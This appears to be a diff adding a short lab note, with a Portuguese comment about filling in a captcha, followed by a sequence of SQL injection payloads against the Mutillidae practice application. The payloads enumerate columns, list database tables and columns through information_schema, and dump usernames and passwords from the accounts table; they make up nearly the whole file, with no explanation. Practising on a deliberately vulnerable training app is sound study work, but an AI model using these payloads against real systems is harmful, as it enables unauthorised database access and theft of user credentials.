@@ -1,0 +1,9 @@
+ ____________________________________________________________________
+// A única diferença é que devemos preencher o captcha para continuar\\
+-----------------------------------------------------------------------
+
+'order by 7#
+' union select 1,2,3,4,5,6,7#
+' union select 1,table_name,table_schema,4,5,6,7 from information_schema.tables#
+' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_schema="mutillidae" and table_name="accounts"#
+' union select 1,username,password,4,5,6,7 from mutillidae.accounts#
